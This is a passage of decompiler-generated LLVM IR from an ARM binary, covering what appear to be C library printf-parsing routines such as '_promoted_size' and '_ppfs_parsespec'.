  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_12a4c = load i32, i32* @r0, align 4
  %v1_12a4c = add i32 %v0_12a4c, 24
  %v2_12a4c = inttoptr i32 %v1_12a4c to i32*
  %v3_12a4c = load i32, i32* %v2_12a4c, align 4
  store i32 %v3_12a4c, i32* %r1.global-to-local, align 4
  %v2_12a50 = icmp eq i32 %v3_12a4c, 0
  %v3_12a54 = load i32, i32* @r4, align 4
  store i32 %v3_12a54, i32* %stack_var_-8, align 4
  %v1_12a58 = add i32 %v0_12a4c, 8
  %v2_12a58 = inttoptr i32 %v1_12a58 to i32*
  %v3_12a58 = load i32, i32* %v2_12a58, align 4
  store i32 %v3_12a58, i32* %r3.global-to-local, align 4
  %v6_12a60 = icmp eq i32 %v3_12a58, -2147483648
  br i1 %v2_12a50, label %dec_label_pc_12a60, label %dec_label_pc_12b98

dec_label_pc_12a60:                               ; preds = %entry
  br i1 %v6_12a60, label %dec_label_pc_12a68, label %dec_label_pc_12a80

dec_label_pc_12a68:                               ; preds = %dec_label_pc_12a60
  %v1_12a68 = add i32 %v0_12a4c, 76
  %v2_12a68 = inttoptr i32 %v1_12a68 to i32*
  %v3_12a68 = load i32, i32* %v2_12a68, align 4
  store i32 %v3_12a68, i32* %r3.global-to-local, align 4
  %v1_12a6c = inttoptr i32 %v3_12a68 to i32*
  %v2_12a6c = load i32, i32* %v1_12a6c, align 4
  store i32 %v2_12a6c, i32* %r2.global-to-local, align 4
  %v1_12a70 = add i32 %v3_12a68, 4
  store i32 %v1_12a70, i32* %r3.global-to-local, align 4
  store i32 %v1_12a70, i32* %v2_12a68, align 4
  %v0_12a78 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a78 = load i32, i32* @r0, align 4
  %v2_12a78 = add i32 %v1_12a78, 8
  %v3_12a78 = inttoptr i32 %v2_12a78 to i32*
  store i32 %v0_12a78, i32* %v3_12a78, align 4
  %v0_12a7c = load i32, i32* %r2.global-to-local, align 4
  %v1_12a7c = load i32, i32* @r0, align 4
  %v2_12a7c = add i32 %v1_12a7c, 80
  %v3_12a7c = inttoptr i32 %v2_12a7c to i32*
  store i32 %v0_12a7c, i32* %v3_12a7c, align 4
  %v0_12a80.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12a80

dec_label_pc_12a80:                               ; preds = %dec_label_pc_12a60, %dec_label_pc_12a68
  %v1_12a9c = phi i32 [ %v0_12a4c, %dec_label_pc_12a60 ], [ %v0_12a80.pre, %dec_label_pc_12a68 ]
  %v1_12a80 = add i32 %v1_12a9c, 4
  %v2_12a80 = inttoptr i32 %v1_12a80 to i32*
  %v3_12a80 = load i32, i32* %v2_12a80, align 4
  store i32 %v3_12a80, i32* %r3.global-to-local, align 4
  %v6_12a84 = icmp eq i32 %v3_12a80, -2147483648
  %v1_12a88 = add i32 %v1_12a9c, 80
  store i32 %v1_12a88, i32* %ip.global-to-local, align 4
  br i1 %v6_12a84, label %dec_label_pc_12a90, label %dec_label_pc_12aa8

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a80
  %v1_12a90 = add i32 %v1_12a9c, 76
  %v2_12a90 = inttoptr i32 %v1_12a90 to i32*
  %v3_12a90 = load i32, i32* %v2_12a90, align 4
  store i32 %v3_12a90, i32* %r3.global-to-local, align 4
  %v1_12a94 = inttoptr i32 %v3_12a90 to i32*
  %v2_12a94 = load i32, i32* %v1_12a94, align 4
  store i32 %v2_12a94, i32* %r2.global-to-local, align 4
  %v1_12a98 = add i32 %v3_12a90, 4
  store i32 %v1_12a98, i32* %r3.global-to-local, align 4
  store i32 %v1_12a98, i32* %v2_12a90, align 4
  %v0_12aa0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12aa0 = load i32, i32* @r0, align 4
  %v2_12aa0 = add i32 %v1_12aa0, 4
  %v3_12aa0 = inttoptr i32 %v2_12aa0 to i32*
  store i32 %v0_12aa0, i32* %v3_12aa0, align 4
  %v0_12aa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12aa4 = load i32, i32* @r0, align 4
  %v2_12aa4 = add i32 %v1_12aa4, 80
  %v3_12aa4 = inttoptr i32 %v2_12aa4 to i32*
  store i32 %v0_12aa4, i32* %v3_12aa4, align 4
  %v0_12b8817.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12aa8

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12a80, %dec_label_pc_12a90
  %v0_12b8817 = phi i32 [ %v1_12a9c, %dec_label_pc_12a80 ], [ %v0_12b8817.pre, %dec_label_pc_12a90 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_12aac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12aac, i32* %lr.global-to-local, align 4
  %v1_12b8818 = add i32 %v0_12b8817, 28
  %v2_12b8819 = inttoptr i32 %v1_12b8818 to i32*
  %v3_12b8820 = load i32, i32* %v2_12b8819, align 4
  store i32 %v3_12b8820, i32* %r3.global-to-local, align 4
  %v5_12b9022 = icmp slt i32 %v0_12aac, %v3_12b8820
  br i1 %v5_12b9022, label %dec_label_pc_12ab4, label %dec_label_pc_12b94.loopexit

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12aa8, %dec_label_pc_12b88.backedge
  %v0_12b8824 = phi i32 [ %v0_12b88, %dec_label_pc_12b88.backedge ], [ %v0_12b8817, %dec_label_pc_12aa8 ]
  %v0_12ac023 = phi i32 [ %v0_12ac0.be, %dec_label_pc_12b88.backedge ], [ %v0_12aac, %dec_label_pc_12aa8 ]
  %v4_12ab4 = mul i32 %v0_12ac023, 4
  %v5_12ab4 = add i32 %v4_12ab4, %v0_12b8824
  store i32 %v5_12ab4, i32* %r3.global-to-local, align 4
  %v1_12ab8 = add i32 %v5_12ab4, 40
  %v2_12ab8 = inttoptr i32 %v1_12ab8 to i32*
  %v3_12ab8 = load i32, i32* %v2_12ab8, align 4
  store i32 %v3_12ab8, i32* %r3.global-to-local, align 4
  %v7_12abc = icmp eq i32 %v3_12ab8, 8
  %v1_12ac0 = add i32 %v0_12ac023, 1
  store i32 %v1_12ac0, i32* %lr.global-to-local, align 4
  br i1 %v7_12abc, label %dec_label_pc_12b88.backedge, label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12ab4
  %v1_12ac8 = add i32 %v0_12b8824, 76
  %v2_12ac8 = inttoptr i32 %v1_12ac8 to i32*
  %v3_12ac8 = load i32, i32* %v2_12ac8, align 4
  store i32 %v3_12ac8, i32* %r1.global-to-local, align 4
  %v8_12acc = icmp sgt i32 %v3_12ab8, 8
  br i1 %v8_12acc, label %dec_label_pc_12af0, label %dec_label_pc_12ad0

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12ac8
  %v7_12ad0 = icmp eq i32 %v3_12ab8, 2
  br i1 %v7_12ad0, label %dec_label_pc_12b40, label %dec_label_pc_12ad8

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12ad0
  %v8_12ad8 = icmp sgt i32 %v3_12ab8, 2
  br i1 %v8_12ad8, label %dec_label_pc_12ae8, label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %dec_label_pc_12ad8
  %v1_12adc = icmp slt i32 %v3_12ab8, 0
  br i1 %v1_12adc, label %dec_label_pc_12b74, label %dec_label_pc_12b40

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ad8
  %v7_12ae8 = icmp eq i32 %v3_12ab8, 7
  br i1 %v7_12ae8, label %dec_label_pc_12b54, label %dec_label_pc_12b74

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12ac8
  %v7_12af0 = icmp eq i32 %v3_12ab8, 1024
  br i1 %v7_12af0, label %dec_label_pc_12b40, label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12af0
  %v8_12af8 = icmp sgt i32 %v3_12ab8, 1024
  br i1 %v8_12af8, label %dec_label_pc_12b10, label %dec_label_pc_12afc

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12af8
  switch i32 %v3_12ab8, label %dec_label_pc_12b74 [
    i32 256, label %dec_label_pc_12b40
    i32 512, label %dec_label_pc_12b40
  ]

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12af8
  %v7_12b10 = icmp eq i32 %v3_12ab8, 2048
  br i1 %v7_12b10, label %dec_label_pc_12b24, label %dec_label_pc_12b1c

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12b10
  %v1_12b18 = load i32, i32* %r4.global-to-local, align 4
  %v9_12b18 = icmp eq i32 %v3_12ab8, %v1_12b18
  br i1 %v9_12b18, label %dec_label_pc_12b54, label %dec_label_pc_12b74

dec_label_pc_12b24:                               ; preds = %dec_label_pc_12b10
  %v1_12b24 = add i32 %v3_12ac8, 7
  %v1_12b28 = and i32 %v1_12b24, -8
  store i32 %v1_12b28, i32* %r3.global-to-local, align 4
  %v1_12b2c = inttoptr i32 %v1_12b28 to i32*
  %v2_12b2c = load i32, i32* %v1_12b2c, align 8
  store i32 %v2_12b2c, i32* %r1.global-to-local, align 4
  %v3_12b2c = or i32 %v1_12b28, 4
  %v4_12b2c = inttoptr i32 %v3_12b2c to i32*
  %v5_12b2c = load i32, i32* %v4_12b2c, align 4
  store i32 %v5_12b2c, i32* %r2.global-to-local, align 4
  %v1_12b30 = add i32 %v1_12b28, 8
  store i32 %v1_12b30, i32* %r3.global-to-local, align 4
  store i32 %v1_12b30, i32* %v2_12ac8, align 4
  %v0_12b38 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b38 = inttoptr i32 %v0_12b38 to i32*
  %v2_12b38 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_12b38, i32* %v1_12b38, align 4
  %v3_12b38 = add i32 %v0_12b38, 4
  %v4_12b38 = inttoptr i32 %v3_12b38 to i32*
  %v5_12b38 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_12b38, i32* %v4_12b38, align 4
  br label %dec_label_pc_12b84

dec_label_pc_12b40:                               ; preds = %dec_label_pc_12afc, %dec_label_pc_12afc, %dec_label_pc_12adc, %dec_label_pc_12af0, %dec_label_pc_12ad0
  %v1_12b40 = inttoptr i32 %v3_12ac8 to i32*
  %v2_12b40 = load i32, i32* %v1_12b40, align 4
  store i32 %v2_12b40, i32* %r2.global-to-local, align 4
  %v1_12b44 = add i32 %v3_12ac8, 4
  store i32 %v1_12b44, i32* %r3.global-to-local, align 4
  store i32 %v1_12b44, i32* %v2_12ac8, align 4
  %v0_12b4c = load i32, i32* %r2.global-to-local, align 4
  %v1_12b4c = load i32, i32* %ip.global-to-local, align 4
  %v2_12b4c = inttoptr i32 %v1_12b4c to i32*
  store i32 %v0_12b4c, i32* %v2_12b4c, align 4
  br label %dec_label_pc_12b84

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12ae8, %dec_label_pc_12b1c
  %v3_12b54 = load i32, i32* %v2_12ac8, align 4
  %v1_12b58 = add i32 %v3_12b54, 7
  %v1_12b5c = and i32 %v1_12b58, -8
  store i32 %v1_12b5c, i32* %r3.global-to-local, align 4
  %v1_12b60 = inttoptr i32 %v1_12b5c to i32*
  %v2_12b60 = load i32, i32* %v1_12b60, align 8
  store i32 %v2_12b60, i32* %r1.global-to-local, align 4
  %v3_12b60 = or i32 %v1_12b5c, 4
  %v4_12b60 = inttoptr i32 %v3_12b60 to i32*
  %v5_12b60 = load i32, i32* %v4_12b60, align 4
  store i32 %v5_12b60, i32* %r2.global-to-local, align 4
  %v1_12b64 = add i32 %v1_12b5c, 8
  store i32 %v1_12b64, i32* %r3.global-to-local, align 4
  store i32 %v1_12b64, i32* %v2_12ac8, align 4
  %v0_12b6c = load i32, i32* %ip.global-to-local, align 4
  %v1_12b6c = inttoptr i32 %v0_12b6c to i32*
  %v2_12b6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_12b6c, i32* %v1_12b6c, align 4
  %v3_12b6c = add i32 %v0_12b6c, 4
  %v4_12b6c = inttoptr i32 %v3_12b6c to i32*
  %v5_12b6c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_12b6c, i32* %v4_12b6c, align 4
  br label %dec_label_pc_12b84

dec_label_pc_12b74:                               ; preds = %dec_label_pc_12afc, %dec_label_pc_12ae8, %dec_label_pc_12adc, %dec_label_pc_12b1c
  %v1_12b74 = add i32 %v3_12ac8, 4
  store i32 %v1_12b74, i32* %r3.global-to-local, align 4
  store i32 %v1_12b74, i32* %v2_12ac8, align 4
  %v0_12b7c = load i32, i32* %r1.global-to-local, align 4
  %v1_12b7c = inttoptr i32 %v0_12b7c to i32*
  %v2_12b7c = load i32, i32* %v1_12b7c, align 4
  store i32 %v2_12b7c, i32* %r3.global-to-local, align 4
  %v1_12b80 = load i32, i32* %ip.global-to-local, align 4
  %v2_12b80 = inttoptr i32 %v1_12b80 to i32*
  store i32 %v2_12b7c, i32* %v2_12b80, align 4
  br label %dec_label_pc_12b84

dec_label_pc_12b84:                               ; preds = %dec_label_pc_12b54, %dec_label_pc_12b40, %dec_label_pc_12b24, %dec_label_pc_12b74
  %v0_12b84 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b84 = add i32 %v0_12b84, 8
  store i32 %v1_12b84, i32* %ip.global-to-local, align 4
  %v0_12b8c.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12b88.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12b88.backedge

dec_label_pc_12b88.backedge:                      ; preds = %dec_label_pc_12b84, %dec_label_pc_12ab4
  %v0_12b88 = phi i32 [ %v0_12b88.pre, %dec_label_pc_12b84 ], [ %v0_12b8824, %dec_label_pc_12ab4 ]
  %v0_12ac0.be = phi i32 [ %v0_12b8c.pre.pre, %dec_label_pc_12b84 ], [ %v1_12ac0, %dec_label_pc_12ab4 ]
  %v1_12b88 = add i32 %v0_12b88, 28
  %v2_12b88 = inttoptr i32 %v1_12b88 to i32*
  %v3_12b88 = load i32, i32* %v2_12b88, align 4
  store i32 %v3_12b88, i32* %r3.global-to-local, align 4
  %v5_12b90 = icmp slt i32 %v0_12ac0.be, %v3_12b88
  br i1 %v5_12b90, label %dec_label_pc_12ab4, label %dec_label_pc_12b88.dec_label_pc_12b94.loopexit_crit_edge

dec_label_pc_12b98:                               ; preds = %entry
  br i1 %v6_12a60, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12b98
  %v2_12b9c = add i32 %v0_12a4c, 36
  %v3_12b9c = inttoptr i32 %v2_12b9c to i8*
  %v4_12b9c = load i8, i8* %v3_12b9c, align 1
  %v5_12b9c = zext i8 %v4_12b9c to i32
  %v5_12ba0 = mul nuw nsw i32 %v5_12b9c, 8
  %v6_12ba0 = add i32 %v5_12ba0, %v0_12a4c
  store i32 %v6_12ba0, i32* %r3.global-to-local, align 4
  %v2_12ba4 = add i32 %v6_12ba0, 72
  %v3_12ba4 = inttoptr i32 %v2_12ba4 to i32*
  %v4_12ba4 = load i32, i32* %v3_12ba4, align 4
  store i32 %v4_12ba4, i32* %r3.global-to-local, align 4
  store i32 %v4_12ba4, i32* %v2_12a58, align 4
  %v0_12bac.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12b98, %bb
  %v2_12bc0 = phi i32 [ %v0_12bac.pre, %bb ], [ %v0_12a4c, %dec_label_pc_12b98 ]
  %v1_12bac = add i32 %v2_12bc0, 4
  %v2_12bac = inttoptr i32 %v1_12bac to i32*
  %v3_12bac = load i32, i32* %v2_12bac, align 4
  store i32 %v3_12bac, i32* %r3.global-to-local, align 4
  %v6_12bb0 = icmp eq i32 %v3_12bac, -2147483648
  br i1 %v6_12bb0, label %bb16, label %dec_label_pc_12b94

bb16:                                             ; preds = %.thread1
  %v2_12bb4 = add i32 %v2_12bc0, 37
  %v3_12bb4 = inttoptr i32 %v2_12bb4 to i8*
  %v4_12bb4 = load i8, i8* %v3_12bb4, align 1
  %v5_12bb4 = zext i8 %v4_12bb4 to i32
  %v5_12bb8 = mul nuw nsw i32 %v5_12bb4, 8
  %v6_12bb8 = add i32 %v5_12bb8, %v2_12bc0
  store i32 %v6_12bb8, i32* %r3.global-to-local, align 4
  %v2_12bbc = add i32 %v6_12bb8, 72
  %v3_12bbc = inttoptr i32 %v2_12bbc to i32*
  %v4_12bbc = load i32, i32* %v3_12bbc, align 4
  store i32 %v4_12bbc, i32* %r3.global-to-local, align 4
  store i32 %v4_12bbc, i32* %v2_12bac, align 4
  %v0_12bc4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12b94

dec_label_pc_12b88.dec_label_pc_12b94.loopexit_crit_edge: ; preds = %dec_label_pc_12b88.backedge
  br label %dec_label_pc_12b94.loopexit

dec_label_pc_12b94.loopexit:                      ; preds = %dec_label_pc_12b88.dec_label_pc_12b94.loopexit_crit_edge, %dec_label_pc_12aa8
  %v0_12b88.lcssa = phi i32 [ %v0_12b88, %dec_label_pc_12b88.dec_label_pc_12b94.loopexit_crit_edge ], [ %v0_12b8817, %dec_label_pc_12aa8 ]
  br label %dec_label_pc_12b94

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b94.loopexit, %.thread1, %bb16
  %v1_12be4 = phi i32 [ %v0_12b88.lcssa, %dec_label_pc_12b94.loopexit ], [ %v2_12bc0, %.thread1 ], [ %v0_12bc4.pre, %bb16 ]
  %v1_12bc4 = add i32 %v1_12be4, 8
  %v2_12bc4 = inttoptr i32 %v1_12bc4 to i32*
  %v3_12bc4 = load i32, i32* %v2_12bc4, align 4
  store i32 %v3_12bc4, i32* %r1.global-to-local, align 4
  %v1_12bc8 = icmp slt i32 %v3_12bc4, 0
  br i1 %v1_12bc8, label %dec_label_pc_12bd0, label %dec_label_pc_12bf0

dec_label_pc_12bd0:                               ; preds = %dec_label_pc_12b94
  %v1_12bd0 = add i32 %v1_12be4, 16
  %v2_12bd0 = inttoptr i32 %v1_12bd0 to i32*
  %v3_12bd0 = load i32, i32* %v2_12bd0, align 4
  %v1_12bd8 = sub i32 0, %v3_12bc4
  store i32 %v1_12bd8, i32* %r1.global-to-local, align 4
  %v1_12bd4 = and i32 %v3_12bd0, -10
  %v1_12bdc = or i32 %v1_12bd4, 8
  store i32 %v1_12bdc, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_12be4 = add i32 %v1_12be4, 20
  %v3_12be4 = inttoptr i32 %v2_12be4 to i32*
  store i32 32, i32* %v3_12be4, align 4
  %v0_12be8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12be8 = load i32, i32* @r0, align 4
  %v2_12be8 = add i32 %v1_12be8, 8
  %v3_12be8 = inttoptr i32 %v2_12be8 to i32*
  store i32 %v0_12be8, i32* %v3_12be8, align 4
  %v0_12bec = load i32, i32* %r3.global-to-local, align 4
  %v1_12bec = load i32, i32* @r0, align 4
  %v2_12bec = add i32 %v1_12bec, 16
  %v3_12bec = inttoptr i32 %v2_12bec to i32*
  store i32 %v0_12bec, i32* %v3_12bec, align 4
  %v1_12bf4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12b94, %dec_label_pc_12bd0
  %v1_12bf4 = phi i32 [ %v1_12be4, %dec_label_pc_12b94 ], [ %v1_12bf4.pre, %dec_label_pc_12bd0 ]
  %v2_12bf0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12bf0, i32* @r4, align 4
  ret i32 %v1_12bf4

; uselistorder directives
  uselistorder i32 %v2_12bc0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12ac0.be, { 1, 0 }
  uselistorder i32 %v0_12b88, { 1, 2, 0 }
  uselistorder i32 %v3_12ac8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_12ac8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_12ab8, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_12ac023, { 1, 0 }
  uselistorder i32 %v0_12b8824, { 0, 2, 1 }
  uselistorder i32 %v0_12b8817, { 2, 0, 1 }
  uselistorder i32 %v0_12a4c, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 72, { 4, 5, 10, 6, 7, 8, 9, 0, 1, 11, 2, 3 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_12bf0, { 1, 0 }
  uselistorder label %dec_label_pc_12b94, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12b84, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12b74, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12b54, { 1, 0 }
  uselistorder label %dec_label_pc_12b40, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_12ab4, { 1, 0 }
  uselistorder label %dec_label_pc_12aa8, { 1, 0 }
  uselistorder label %dec_label_pc_12a80, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_12c18.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12c20, %entry
  %v0_12c14 = phi i32 [ %v1_12c14, %dec_label_pc_12c20 ], [ add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37066), %entry ]
  %v1_12c14 = add i32 %v0_12c14, -2
  %v2_12c14 = inttoptr i32 %v1_12c14 to i16*
  %v3_12c14 = load i16, i16* %v2_12c14, align 2
  %v4_12c14 = sext i16 %v3_12c14 to i32
  store i32 %v1_12c14, i32* @ip, align 4
  %v9_12c18 = icmp eq i32 %v4_12c14, %v1_12c18.pre
  br i1 %v9_12c18, label %dec_label_pc_12c14.dec_label_pc_12c28_crit_edge, label %dec_label_pc_12c20

dec_label_pc_12c14.dec_label_pc_12c28_crit_edge:  ; preds = %dec_label_pc_12c14
  br label %dec_label_pc_12c28

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c14
  %tmp = icmp ugt i32 %v1_12c14, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37090)
  br i1 %tmp, label %dec_label_pc_12c14, label %dec_label_pc_12c28.loopexit

dec_label_pc_12c28.loopexit:                      ; preds = %dec_label_pc_12c20
  br label %dec_label_pc_12c28

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12c28.loopexit, %dec_label_pc_12c14.dec_label_pc_12c28_crit_edge
  %v2_12c38.pre-phi = sub i32 %v1_12c14, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37090)
  store i32 %v2_12c38.pre-phi, i32* @r2, align 4
  %v4_12c3c = sdiv i32 %v2_12c38.pre-phi, 2
  %v5_12c3c = add i32 %v4_12c3c, add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37066)
  %v6_12c3c = inttoptr i32 %v5_12c3c to i8*
  %v7_12c3c = load i8, i8* %v6_12c3c, align 1
  %v9_12c3c = zext i8 %v7_12c3c to i32
  ret i32 %v9_12c3c

; uselistorder directives
  uselistorder i32 %v2_12c38.pre-phi, { 1, 0 }
  uselistorder i32 %v1_12c14, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37090), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12c50 = load i32, i32* @r4, align 4
  store i32 %v3_12c50, i32* %stack_var_-36, align 4
  %v6_12c50 = load i32, i32* @r5, align 4
  %v27_12c50 = load i32, i32* @lr, align 4
  %v0_12c54 = load i32, i32* %r0.global-to-local, align 4
  %v1_12c54 = add i32 %v0_12c54, 16
  %v2_12c54 = inttoptr i32 %v1_12c54 to i32*
  %v3_12c54 = load i32, i32* %v2_12c54, align 4
  %v1_12c5c = and i32 %v3_12c54, 128
  store i32 %v1_12c5c, i32* @r4, align 4
  %v2_12c5c = icmp eq i32 %v1_12c5c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_12c54, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @lr, align 4
  %v1_12c84 = add i32 %v0_12c54, 24
  %v2_12c84 = inttoptr i32 %v1_12c84 to i32*
  %v3_12c84 = load i32, i32* %v2_12c84, align 4
  store i32 %v3_12c84, i32* %fp.global-to-local, align 4
  br i1 %v2_12c5c, label %.dec_label_pc_12cd8_crit_edge, label %dec_label_pc_12c90

.dec_label_pc_12cd8_crit_edge:                    ; preds = %entry
  %v2_12c88 = inttoptr i32 %v0_12c54 to i32*
  %v3_12c88 = load i32, i32* %v2_12c88, align 4
  store i32 %v3_12c88, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_12cd8

dec_label_pc_12c90:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12ca0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_12c94

dec_label_pc_12c94:                               ; preds = %dec_label_pc_12cc4.dec_label_pc_12c94_crit_edge, %dec_label_pc_12c90
  %v1_12ca4 = phi i32 [ %v1_12cb4, %dec_label_pc_12cc4.dec_label_pc_12c94_crit_edge ], [ 0, %dec_label_pc_12c90 ]
  %v0_12c94 = phi i32 [ %v0_12c94.pre, %dec_label_pc_12cc4.dec_label_pc_12c94_crit_edge ], [ %v0_12c54, %dec_label_pc_12c90 ]
  %v1_12c94 = inttoptr i32 %v0_12c94 to i32*
  %v2_12c94 = load i32, i32* %v1_12c94, align 4
  %v4_12c98 = mul i32 %v1_12ca4, 4
  %v5_12c98 = add i32 %v2_12c94, %v4_12c98
  store i32 %v5_12c98, i32* %r3.global-to-local, align 4
  %v1_12c9c = add i32 %v5_12c98, -4
  %v2_12c9c = inttoptr i32 %v1_12c9c to i8*
  %v3_12c9c = load i8, i8* %v2_12c9c, align 1
  %v4_12c9c = zext i8 %v3_12c9c to i32
  store i32 %v4_12c9c, i32* %r1.global-to-local, align 4
  store i32 %v2_12ca0, i32* @ip, align 4
  %v2_12ca4 = add i32 %v1_12ca4, %v2_12ca0
  store i32 %v2_12ca4, i32* %r2.global-to-local, align 4
  %v3_12ca8 = add i32 %v2_12ca4, -72
  %v4_12ca8 = inttoptr i32 %v3_12ca8 to i8*
  store i8 %v3_12c9c, i8* %v4_12ca8, align 1
  %v0_12cac = load i32, i32* %r3.global-to-local, align 4
  %v1_12cac = add i32 %v0_12cac, -4
  %v2_12cac = inttoptr i32 %v1_12cac to i32*
  %v3_12cac = load i32, i32* %v2_12cac, align 4
  store i32 %v3_12cac, i32* %r3.global-to-local, align 4
  %v0_12cb0 = load i32, i32* %r1.global-to-local, align 4
  %v9_12cb0 = icmp eq i32 %v0_12cb0, %v3_12cac
  %v0_12cb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_12cb4 = add i32 %v0_12cb4, 1
  store i32 %v1_12cb4, i32* %r0.global-to-local, align 4
  br i1 %v9_12cb0, label %dec_label_pc_12cbc, label %dec_label_pc_13180

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12c94
  %v2_12cbc = icmp eq i32 %v3_12cac, 0
  br i1 %v2_12cbc, label %dec_label_pc_12ccc, label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12cbc
  %tmp182 = icmp ult i32 %v1_12cb4, 32
  br i1 %tmp182, label %dec_label_pc_12cc4.dec_label_pc_12c94_crit_edge, label %dec_label_pc_12ccc

dec_label_pc_12cc4.dec_label_pc_12c94_crit_edge:  ; preds = %dec_label_pc_12cc4
  %v0_12c94.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12c94

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cc4, %dec_label_pc_12cbc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_12cd4 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_12cd4, i32* %r0.global-to-local, align 4
  %v0_12ce4.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_12cd8

dec_label_pc_12cd8:                               ; preds = %.dec_label_pc_12cd8_crit_edge, %dec_label_pc_12ccc
